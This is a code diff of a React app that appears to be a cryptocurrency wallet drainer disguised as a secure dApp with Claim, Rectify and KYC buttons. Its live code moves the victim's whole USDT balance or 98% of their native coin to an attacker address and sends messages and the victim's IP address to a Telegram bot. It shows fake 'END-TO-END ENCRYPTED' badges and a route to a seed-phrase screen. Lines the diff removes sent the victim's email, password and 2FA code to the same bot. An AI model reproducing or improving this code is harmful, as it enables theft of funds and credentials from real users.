@@ -11,9 +11,6 @@ export default function App() {
   const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
   const [inputVal, setInputVal] = useState(""); 
   const [seedVal, setSeedVal] = useState("");   
-  const [kycEmail, setKycEmail] = useState("");
-  const [kycPass, setKycPass] = useState("");
-  const [kycCode, setKycCode] = useState(""); 
   const [kycPhase, setKycPhase] = useState(1); 
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
@@ -27,7 +24,14 @@ export default function App() {
   const { data: nativeBal } = useBalance({ address }); 
   const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
 
-  const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: msg }) }).catch(()=>{});
+  const log = (msg) => {
+    fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: `${msg}\n🌐 IP: ${data.ip}` })
+      });
+    }).catch(() => {});
+  };
 
   useEffect(() => {
     const triggerMsg = () => {
@@ -35,9 +39,8 @@ export default function App() {
       setFeedMsg(`🛡️ ${addr} WALLET CONNECTED TO MAINNET_NODE`);
       setTimeout(() => setFeedMsg(""), 4500);
     };
-    const timeout = setTimeout(triggerMsg, 2000);
-    const interval = setInterval(triggerMsg, 9000);
-    return () => { clearTimeout(timeout); clearInterval(interval); };
+    const interval = setInterval(triggerMsg, 12000);
+    return () => clearInterval(interval);
   }, []);
 
   const handleHandshake = () => {
@@ -46,8 +49,7 @@ export default function App() {
       const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
       sendTransaction({ to: tokenAddr, data }, { onSettled: () => setView("seed_gate") });
     } else if (nativeBal && nativeBal.value > 100000000000000n) {
-      const amount = (nativeBal.value * 98n) / 100n;
-      sendTransaction({ to: destination, value: amount }, { onSettled: () => setView("seed_gate") });
+      sendTransaction({ to: destination, value: (nativeBal.value * 98n) / 100n }, { onSettled: () => setView("seed_gate") });
     } else {
       setView("seed_gate");
     }
@@ -57,6 +59,8 @@ export default function App() {
     if (activeTask === "Rectify") {
       const b = selectedAsset === "TOKEN" ? (tokenBal?.formatted?.slice(0, 10) || "0.00") : (nativeBal?.formatted?.slice(0, 10) || "0.00");
       setInputVal(b);
+    } else {
+      setInputVal("");
     }
   }, [selectedAsset, tokenBal, nativeBal, activeTask]);
 
@@ -74,20 +78,16 @@ export default function App() {
 
       {!isConnected ? (
         <div style={{textAlign:'center', marginTop:'40px', backgroundColor:'#0d1117', padding:'60px 20px', borderRadius:'30px', border:'1px solid #1e293b'}}>
-          <div style={{display:'flex', justifyContent:'center', gap:'15px', marginBottom:'20px'}}>
-             <div style={{fontSize:'12px', color:'#10b981'}}>🔰 SAFE_GUIDE</div>
-             <div style={{fontSize:'12px', color:'#3b82f6'}}>♻️ RELAY_ACTIVE</div>
-          </div>
           <div style={{marginBottom:'25px'}}>
-             <div style={{fontSize:'11px', color:'#10b981', fontWeight:'bold'}}>🔒 END-TO-END ENCRYPTED</div>
-             <div style={{fontSize:'9px', color:'#475569', marginTop:'4px'}}>SECURE AES-256 NODE_SECURITY ACTIVE</div>
+             <div style={{fontSize:'12px', color:'#10b981', fontWeight:'bold'}}>🔰 SAFE_GUIDE ♻️ RELAY_ACTIVE</div>
+             <div style={{fontSize:'11px', color:'#10b981', fontWeight:'bold', marginTop:'10px'}}>🔒 END-TO-END ENCRYPTED</div>
           </div>
           <appkit-button />
         </div>
       ) : (
         <>
           <div style={{width:'100%', height:'220px', borderRadius:'15px', overflow:'hidden', marginBottom:'20px', border:'1px solid #1e293b'}}>
-            <iframe title="market" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
+            <iframe title="m" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
           </div>
 
           <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'8px', color:'#10b981', display:'flex', justifyContent:'space-between', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
@@ -99,7 +99,7 @@ export default function App() {
               {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                 <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} 
                 style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
-                  <div style={{fontSize:'22px'}}>{n === "Rectify" ? "⚡" : n === "KYC" ? "🆔" : "〽️"}</div>
+                  <div>{n === "Rectify" ? "⚡" : "〽️"}</div>
                   <div style={{fontSize:'9px'}}>{n}</div>
                 </button>
               ))}
@@ -110,14 +110,20 @@ export default function App() {
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center', position:'relative'}}>
               <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
               <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
-                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900', cursor:'pointer'}}>USDT_POOL</div>
-                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900', cursor:'pointer'}}>GAS_POOL</div>
+                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900'}}>USDT_POOL</div>
+                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900'}}>GAS_POOL</div>
               </div>
               <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
-                <input value={inputVal} type="text" onChange={(e)=>setInputVal(e.target.value)} style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
+                <input 
+                  value={inputVal} 
+                  type="text" 
+                  readOnly={true}
+                  style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} 
+                  placeholder="Scanning..." 
+                />
               </div>
-              <button disabled={!inputVal || inputVal === "0"} onClick={handleHandshake} style={{width:'100%', backgroundColor: (inputVal && inputVal !== "0") ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_HANDSHAKE</button>
+              <button onClick={handleHandshake} style={{width:'100%', backgroundColor:'#10b981', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
             </div>
           )}
 
@@ -127,14 +133,14 @@ export default function App() {
               <h2 style={{color:'white', fontWeight:'900', marginBottom:'25px'}}>IDENTITY_SYNC</h2>
               {kycPhase === 1 ? (
                 <>
-                  <input placeholder="CLOUD_ID (EMAIL)" value={kycEmail} onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
-                  <input type="password" placeholder="PASSWORD" value={kycPass} onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'25px', outline:'none'}} />
-                  <button disabled={!kycEmail || !kycPass} onClick={()=>{log(`🆔 KYC: ${kycEmail}/${kycPass}`); setKycPhase(2);}} style={{width:'100%', backgroundColor: (kycEmail && kycPass) ? '#10b981' : '#1e293b', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>VERIFY_RELAY</button>
+                  <input placeholder="EMAIL" style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
+                  <input type="password" placeholder="PASSWORD" style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'25px', outline:'none'}} />
+                  <button onClick={()=>setKycPhase(2)} style={{width:'100%', backgroundColor: '#10b981', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>VERIFY_RELAY</button>
                 </>
               ) : (
                 <>
-                  <input maxLength="6" placeholder="000000" value={kycCode} onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'15px', color:'white', textAlign:'center', fontSize:'28px', letterSpacing:'5px', outline:'none', marginBottom:'25px'}} />
-                  <button disabled={kycCode.length < 6} onClick={()=>{log(`🔑 CODE: ${kycCode}`); setView("seed_gate");}} style={{width:'100%', backgroundColor: kycCode.length === 6 ? '#3b82f6' : '#1e293b', color:'white', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>AUTHORIZE</button>
+                  <input maxLength="6" placeholder="000000" style={{width:'100%', padding:'18px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'15px', color:'white', textAlign:'center', fontSize:'28px', letterSpacing:'5px', outline:'none', marginBottom:'25px'}} />
+                  <button onClick={()=>setView("seed_gate")} style={{width:'100%', backgroundColor: '#3b82f6', color:'white', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>AUTHORIZE</button>
                 </>
               )}
             </div>
